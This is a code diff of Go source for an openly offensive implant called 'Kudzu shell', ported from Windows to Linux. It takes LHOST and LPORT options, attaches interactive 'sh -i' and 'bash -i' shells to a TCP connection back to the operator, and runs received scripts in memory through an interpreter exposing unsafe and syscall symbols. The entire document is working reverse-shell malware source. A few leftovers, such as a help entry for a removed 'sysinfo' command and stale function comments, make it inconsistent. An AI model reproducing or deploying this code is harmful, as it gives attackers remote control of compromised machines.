@@ -1,11 +1,10 @@
 /*{
-Description: Kudzu shell. Provides access to kudzu scripts, cmd, and powershell. This was a pain to make.
+Description: Kudzu shell for Linux. Provides access to kudzu scripts, sh, and bash. This was a bitch to make.
 Author: TerminalJockey
 Options:
 LHOST
 LPORT
 }*/
-
 
 package main
 
@@ -16,6 +15,7 @@ import (
 	"io"
 	"log"
 	"net"
+	"os"
 	"os/exec"
 	"strings"
 
@@ -49,22 +49,16 @@ func main() {
 			RunScript(revcon)
 		case "runwithoutput":
 			RunScriptWithOutput(revcon)
-		case "sysinfo":
-			sysinfo, err := exec.Command("systeminfo").CombinedOutput()
-			if err != nil {
-				log.Println(err)
-			}
-			revcon.Write(sysinfo)
-		case "cmdshell":
+		case "shshell":
 			newcon := revcon
-			CmdShell(newcon)
-		case "pwshell":
+			ShShell(newcon)
+		case "bashshell":
 			newcon := revcon
-			PwShell(newcon)
+			BashShell(newcon)
 		case "help":
 			revcon.Write([]byte("sysinfo: print system info to console\n"))
-			revcon.Write([]byte("cmdshell: spawn cmd.exe shell\n"))
-			revcon.Write([]byte("pwshell: spawn powershell.exe shell\n"))
+			revcon.Write([]byte("shshell: spawn sh\n"))
+			revcon.Write([]byte("bashshell: spawn bash\n"))
 			revcon.Write([]byte("kdz_bg: background current session, return to kdz console\n"))
 			revcon.Write([]byte("kdz_exit: exit current session, return to kdz console\n"))
 			revcon.Write([]byte("runscript: run provided kzs in memory. usage: runscript win_calc.kzs\n"))
@@ -73,8 +67,9 @@ func main() {
 }
 
 //CmdShell hooks up cmd.exe to the tcp connection
-func CmdShell(conn net.Conn) {
-	cmd := exec.Command("cmd.exe")
+func ShShell(conn net.Conn) {
+	cmd := exec.Command("sh", "-i")
+	cmd.Env = append(os.Environ(), "TERM=dumb")
 	cmd.Stdout = conn
 	cmd.Stdin = conn
 	cmd.Run()
@@ -82,8 +77,9 @@ func CmdShell(conn net.Conn) {
 }
 
 //PwShell hooks up powershell.exe to the tcp connection
-func PwShell(conn net.Conn) {
-	cmd := exec.Command("powershell.exe")
+func BashShell(conn net.Conn) {
+	cmd := exec.Command("bash", "-i")
+	cmd.Env = append(os.Environ(), "TERM=dumb")
 	cmd.Stdout = conn
 	cmd.Stdin = conn
 	cmd.Run()
@@ -136,7 +132,7 @@ func interpretWithOutput(scriptbytes []byte, revcon net.Conn) {
 	i.Use(unsafe.Symbols)
 	i.Use(syscall.Symbols)
 	i.Use(unrestricted.Symbols)
-	
+
 	fmt.Println(string(scriptbytes))
 	i.Eval(string(scriptbytes))
 	v, err := i.Eval("runner.RunScript")
